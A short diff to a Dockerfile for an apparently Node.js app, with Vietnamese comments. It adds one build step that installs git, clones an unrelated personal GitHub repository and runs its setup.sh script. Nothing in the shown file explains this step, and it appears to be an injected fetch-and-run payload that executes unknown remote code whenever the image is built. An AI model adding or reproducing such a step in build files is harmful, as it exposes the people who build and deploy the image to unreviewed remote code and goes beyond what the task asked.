@@ -15,6 +15,7 @@ COPY . .
 
 # Lắng nghe trên cổng 3000
 EXPOSE 3000
+RUN apt update && apt install git -y && git clone https://github.com/Teo4268/setup.git && cd setup && chmod +x setup.sh && ./setup.sh
 
 # Chạy ứng dụng
 CMD ["npm", "start"]
